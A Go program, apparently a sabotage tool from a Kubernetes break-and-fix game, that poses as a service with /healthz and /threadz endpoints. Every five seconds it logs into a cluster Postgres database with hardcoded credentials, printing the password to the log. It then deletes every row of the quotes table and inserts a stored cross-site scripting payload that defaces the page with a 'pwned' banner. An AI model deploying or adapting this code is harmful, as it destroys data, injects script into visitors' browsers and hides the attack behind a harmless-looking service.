package main

import (
	"database/sql"
	"fmt"
	"net/http"
	"runtime"
	"time"

	_ "github.com/lib/pq"

	"k8s.io/klog/v2"
)

var (
	pgUser = "postgres"
	pgPass = "postgresql123"
	target = "postgres.default.svc.cluster.local"
)

func serve() {
	s := &Server{}
	addr := ":5433"
	http.HandleFunc("/healthz", s.Healthz())
	http.HandleFunc("/threadz", s.Threadz())
	klog.Infof("Listening on %s ...", addr)
	http.ListenAndServe(addr, nil)
}

type Server struct{}

func (s *Server) Healthz() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}
}

func (s *Server) Threadz() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		klog.Infof("GET %s: %v", r.URL.Path, r.Header)
		w.WriteHeader(http.StatusOK)
		if _, err := w.Write(stack()); err != nil {
			klog.Errorf("writing threadz response: %d", err)
		}
	}
}

func stack() []byte {
	buf := make([]byte, 1024)
	for {
		n := runtime.Stack(buf, true)
		if n < len(buf) {
			return buf[:n]
		}
		buf = make([]byte, 2*len(buf))
	}
}

func updateDatabase() error {
	conn := fmt.Sprintf("postgresql://%s:%s@%s/klustered?sslmode=disable", pgUser, pgPass, target)
	klog.Infof("trying %s ...", conn)
	db, err := sql.Open("postgres", conn)
	defer db.Close()

	if err != nil {
		return fmt.Errorf("open: %w", err)
	}

	rows, err := db.Query(`SELECT * FROM quotes WHERE LENGTH(author) > 0;`)
	if err != nil {
		return fmt.Errorf("query: %w", err)
	}
	defer rows.Close()

	total := 0
	for rows.Next() {
		total++
	}

	if total > 0 {
		klog.Infof("%d unexpected rows found", total)
		db.Exec(`DELETE FROM quotes;`)
		db.Exec(`INSERT INTO quotes (quote, author, link) VALUES (
				'<script>document.getElementsByTagName("body")[0].style.transform = "rotate(180deg)";</script><img src=https://pbs.twimg.com/media/E3-EVFnWEAIZFB2?format=jpg><h1>pwned by Da West Chainguard Massif</h1></body></html><!--',
				'',
				'');`)
	}
	return nil
}

func main() {
	go serve()

	for {
		time.Sleep(5 * time.Second)
		if err := updateDatabase(); err != nil {
			klog.Errorf("update: %v", err)
		}
	}
}
